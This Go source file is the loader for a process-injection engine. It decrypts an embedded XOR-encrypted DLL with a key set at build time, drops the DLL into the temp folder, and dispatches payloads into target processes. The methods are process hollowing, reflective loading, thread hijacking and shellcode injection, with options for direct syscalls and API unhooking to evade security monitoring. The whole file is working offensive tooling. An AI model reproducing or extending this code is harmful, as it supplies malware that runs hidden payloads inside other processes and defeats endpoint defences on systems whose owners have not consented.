package main

import (
	_ "embed"
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

// -----------------------------------------------------------------------------
// Embedded encrypted libjockey.dll.
// Encrypted at build time with a fresh random XOR key.
// The key is injected via -ldflags "-X main.xorKeyHex=<64-hex>".
// -----------------------------------------------------------------------------
//go:embed libjockey.enc
var jockeyEncrypted []byte

// -----------------------------------------------------------------------------
// Lazy DLL state
// -----------------------------------------------------------------------------
var (
	jockeyDLL  *syscall.LazyDLL
	procInject *syscall.LazyProc

	decodedKeyOnce sync.Once
	decodedKey     []byte
)

// getXorKey decodes the hex-encoded build-time XOR key exactly once.
// Panics if the key was not injected properly, since every subsequent
// decryption would produce garbage.
func getXorKey() []byte {
	decodedKeyOnce.Do(func() {
		if len(xorKeyHex) != 64 {
			panic(fmt.Sprintf("xorKeyHex must be 64 hex chars, got %d", len(xorKeyHex)))
		}
		decodedKey = make([]byte, 32)
		for i := 0; i < 32; i++ {
			hi := hexNibble(xorKeyHex[i*2])
			lo := hexNibble(xorKeyHex[i*2+1])
			decodedKey[i] = (hi << 4) | lo
		}
	})
	return decodedKey
}

func hexNibble(c byte) byte {
	switch {
	case c >= '0' && c <= '9':
		return c - '0'
	case c >= 'a' && c <= 'f':
		return c - 'a' + 10
	case c >= 'A' && c <= 'F':
		return c - 'A' + 10
	}
	panic(fmt.Sprintf("invalid hex char in xorKeyHex: %q", c))
}

// decryptDLL XOR-decrypts the embedded DLL blob using the build-time key.
func decryptDLL() []byte {
	key := getXorKey()
	out := make([]byte, len(jockeyEncrypted))
	for i := range jockeyEncrypted {
		out[i] = jockeyEncrypted[i] ^ key[i%32]
	}
	return out
}

// -----------------------------------------------------------------------------
// InjectionConfig mirrors the C struct layout exactly (x64, 48 bytes):
//   int32  method              @0
//   uint32 targetPid           @4
//   ptr    targetImage         @8
//   ptr    payload            @16
//   size_t payloadSize        @24
//   ptr    payloadPath        @32
//   int32  useDirectSyscalls  @40
//   int32  unhookApi          @44
// -----------------------------------------------------------------------------
type InjectionConfig struct {
	Method            int32
	TargetPid         uint32
	TargetImage       uintptr
	Payload           uintptr
	PayloadSize       uintptr
	PayloadPath       uintptr
	UseDirectSyscalls int32
	UnhookApi         int32
	_pad              [4]byte
}

type InjectionResult struct {
	Success bool
	Code    int
	Message string
}

// -----------------------------------------------------------------------------
// Engine lifecycle
// -----------------------------------------------------------------------------
func loadEngine() error {
	plain := decryptDLL()
	if len(plain) < 2 || plain[0] != 'M' || plain[1] != 'Z' {
		return fmt.Errorf("decrypted DLL is not a valid PE (bad key or bad build)")
	}

	// Write to a unique temp file
	name := fmt.Sprintf("tmp_%d_%d.dll", os.Getpid(), time.Now().UnixNano())
	path := filepath.Join(os.Getenv("TEMP"), name)
	if err := os.WriteFile(path, plain, 0755); err != nil {
		return fmt.Errorf("write dll: %w", err)
	}

	jockeyDLL = syscall.NewLazyDLL(path)
	if err := jockeyDLL.Load(); err != nil {
		return fmt.Errorf("load dll: %w", err)
	}

	procInject = jockeyDLL.NewProc("inject_process")
	if err := procInject.Find(); err != nil {
		return fmt.Errorf("inject_process not exported: %w", err)
	}
	return nil
}

// InitializeEngine loads the engine and returns an error on failure.
// Called from main() so startup can fail loudly instead of silently.
func InitializeEngine() error {
	return loadEngine()
}

// -----------------------------------------------------------------------------
// Injection dispatcher
// -----------------------------------------------------------------------------
func InjectPayload(action string, targetPid uint32, targetImage string, payload []byte, useSyscalls, unhook bool) InjectionResult {
	var method int32
	switch action {
	case "hollow":
		method = 1
	case "reflect":
		method = 2
	case "hijack":
		method = 3
	case "shellcode":
		method = 4
	default:
		return InjectionResult{false, -2, fmt.Sprintf("unknown action: %s", action)}
	}

	var cImage uintptr
	if targetImage != "" {
		p, err := syscall.BytePtrFromString(targetImage)
		if err != nil {
			return InjectionResult{false, -3, fmt.Sprintf("cstring: %v", err)}
		}
		cImage = uintptr(unsafe.Pointer(p))
	}

	// Copy payload into a Go-owned buffer that survives the C call.
	var payloadPtr uintptr
	var payBuf []byte
	if len(payload) > 0 {
		payBuf = make([]byte, len(payload))
		copy(payBuf, payload)
		payloadPtr = uintptr(unsafe.Pointer(&payBuf[0]))
	}

	var u, h int32
	if useSyscalls {
		u = 1
	}
	if unhook {
		h = 1
	}

	cfg := InjectionConfig{
		Method:            method,
		TargetPid:         targetPid,
		TargetImage:       cImage,
		Payload:           payloadPtr,
		PayloadSize:       uintptr(len(payload)),
		PayloadPath:       0,
		UseDirectSyscalls: u,
		UnhookApi:         h,
	}

	r, _, _ := procInject.Call(uintptr(unsafe.Pointer(&cfg)))
	_ = payBuf // keep alive across the call

	if int32(r) == 0 {
		return InjectionResult{true, 0, "Injection succeeded"}
	}
	return InjectionResult{false, int(r), fmt.Sprintf("Injection failed: %d", int(r))}
}